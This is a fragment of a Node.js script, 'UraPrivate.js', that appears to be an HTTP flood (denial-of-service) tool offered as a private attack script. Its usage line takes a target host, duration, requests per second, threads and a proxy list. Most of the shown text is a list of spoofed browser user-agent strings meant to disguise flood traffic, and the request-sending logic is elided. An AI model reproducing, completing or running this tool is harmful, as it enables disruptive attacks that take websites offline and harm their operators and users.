/// New Script Ura Private No Leak
/// Ura Custem Script
const net = require("net");
 ...
 if (process.argv.length < 7){console.log(gradient.vice(`[!] node UraPrivate.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));; process.exit();}
 const headers = {};
 ...
 const uap = [
     ...
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Symbian/Belle; ARM; fr-FR) AppleWebKit/58.0 (KHTML, like Gecko) Maxthon/58.0 Safari/58.0",
     "Mozilla/5.0 (BlackBerry/10.2; ARM; fr-FR) AppleWebKit/62.0 (KHTML, like Gecko) IceCat/62.0 Safari/62.0",
     "Mozilla/5.0 (Chrome OS/13421.67.0; x86_64; en-US) AppleWebKit/69.0 (KHTML, like Gecko) Mozilla/69.0 Safari/69.0",
     "Mozilla/5.0 (Symbian/S60; x86; en-GB) AppleWebKit/96.0 (KHTML, like Gecko) Samsung Internet/96.0 Safari/96.0",
     "Mozilla/5.0 (Tizen/3.0; ARM; fr-FR) AppleWebKit/96.0 (KHTML, like Gecko) Waterfox/96.0 Safari/96.0",
     "Mozilla/5.0 (Macintosh/68K; x86; en-US) AppleWebKit/79.0 (KHTML, like Gecko) Torch Browser/79.0 Safari/79.0",
     "Mozilla/5.0 (BlackBerry/6.0; ARM; en-GB) AppleWebKit/69.0 (KHTML, like Gecko) Konqueror/69.0 Safari/69.0",
     "Mozilla/5.0 (Linux/ARM; de-DE) AppleWebKit/85.0 (KHTML, like Gecko) Pale Moon/85.0 Safari/85.0",
     "Mozilla/5.0 (Windows NT/3.0; Win64; zh_CN) AppleWebKit/59.0 (KHTML, like Gecko) Pale Moon/59.0 Safari/59.0",
     "Mozilla/5.0 (Macintosh/PowerPC; x86_64; de-DE) AppleWebKit/57.0 (KHTML, like Gecko) Slimjet/57.0 Safari/57.0",
     "Mozilla/5.0 (Chrome OS/13421.66.0; x86; fr-FR) AppleWebKit/88.0 (KHTML, like Gecko) Midori/88.0 Safari/88.0",
     "Mozilla/5.0 (Tizen/2.4; ARM; zh_CN) AppleWebKit/81.0 (KHTML, like Gecko) Yandex Browser/81.0 Safari/81.0",
     "Mozilla/5.0 (BlackBerry/7.1; ARM; en-GB) AppleWebKit/54.0 (KHTML, like Gecko) Firefox/54.0 Safari/54.0",
     "Mozilla/5.0 (webOS/1.4; ARM; en-GB) AppleWebKit/86.0 (KHTML, like Gecko) Lunascape/86.0 Safari/86.0",
     "Mozilla/5.0 (Symbian/S60; ARM; fr-FR) AppleWebKit/67.0 (KHTML, like Gecko) Slimjet/67.0 Safari/67.0",
     "Mozilla/5.0 (Android/Android 6; x86_64; de-DE) AppleWebKit/87.0 (KHTML, like Gecko) Internet Explorer/87.0 Safari/87.0",
     "Mozilla/5.0 (Windows CE/7.0; x86; en-US) AppleWebKit/86.0 (KHTML, like Gecko) Waterfox/86.0 Safari/86.0",
     "Mozilla/5.0 (Tizen/4.0; ARM; en-US) AppleWebKit/91.0 (KHTML, like Gecko) Slimjet/91.0 Safari/91.0",
     "Mozilla/5.0 (X11/Fedora; x86_64; en-US) AppleWebKit/55.0 (KHTML, like Gecko) Opera/55.0 Safari/55.0",
     "Mozilla/5.0 (webOS/1.0; ARM; en-GB) AppleWebKit/59.0 (KHTML, like Gecko) Qutebrowser/59.0 Safari/59.0",
     "Mozilla/5.0 (Linux/x86; de-DE) AppleWebKit/67.0 (KHTML, like Gecko) Avast Secure Browser/67.0 Safari/67.0",
     "Mozilla/5.0 (webOS/3.0; ARM; en-GB) AppleWebKit/62.0 (KHTML, like Gecko) Vivaldi/62.0 Safari/62.0",
     "Mozilla/5.0 (Macintosh/Intel Mac OS X 10_13_6; x86_64; zh_CN) AppleWebKit/59.0 (KHTML, like Gecko) Slimjet/59.0 Safari/59.0",
     "Mozilla/5.0 (X11/openSUSE; x86_64; en-US) AppleWebKit/98.0 (KHTML, like Gecko) GreenBrowser/98.0 Safari/98.0",
     "Mozilla/5.0 (BlackBerry/10.1; x86; fr-FR) AppleWebKit/58.0 (KHTML, like Gecko) Torch Browser/58.0 Safari/58.0",
     "Mozilla/5.0 (Linux/x86_64; de-DE) AppleWebKit/62.0 (KHTML, like Gecko) Torch Browser/62.0 Safari/62.0",
     "Mozilla/5.0 (Bada/2.0; ARM; zh_CN) AppleWebKit/64.0 (KHTML, like Gecko) Otter Browser/64.0 Safari/64.0",
     "Mozilla/5.0 (Tizen/4.0; ARM; fr-FR) AppleWebKit/62.0 (KHTML, like Gecko) Midori/62.0 Safari/62.0",
     "Mozilla/5.0 (Windows Phone/7.0; ARM; fr-FR) AppleWebKit/77.0 (KHTML, like Gecko) Konqueror/77.0 Safari/77.0",
     "Mozilla/5.0 (BlackBerry/10.2; x86; en-US) AppleWebKit/84.0 (KHTML, like Gecko) Pale Moon/84.0 Safari/84.0",
     "Mozilla/5.0 (Android/Android 11; ARM; en-GB) AppleWebKit/78.0 (KHTML, like Gecko) Konqueror/78.0 Safari/78.0",
     "Mozilla/5.0 (Windows CE/5.0; ARM; en-GB) AppleWebKit/72.0 (KHTML, like Gecko) Slimjet/72.0 Safari/72.0",
     "Mozilla/5.0 (Macintosh/Intel Mac OS X 10_13_6; x86_64; zh_CN) AppleWebKit/56.0 (KHTML, like Gecko) Edge/56.0 Safari/56.0",
     "Mozilla/5.0 (webOS/1.0; ARM; de-DE) AppleWebKit/54.0 (KHTML, like Gecko) Otter Browser/54.0 Safari/54.0",
     "Mozilla/5.0 (Bada/2.0; ARM; de-DE) AppleWebKit/67.0 (KHTML, like Gecko) Lunascape/67.0 Safari/67.0",
     "Mozilla/5.0 (Tizen/4.0; ARM; de-DE) AppleWebKit/76.0 (KHTML, like Gecko) Torch Browser/76.0 Safari/76.0",
     "Mozilla/5.0 (Chrome OS/13421.62.0; x86; fr-FR) AppleWebKit/66.0 (KHTML, like Gecko) Samsung Internet/66.0 Safari/66.0",
     "Mozilla/5.0 (Windows CE/5.0; x86; fr-FR) AppleWebKit/59.0 (KHTML, like Gecko) Maxthon/59.0 Safari/59.0",
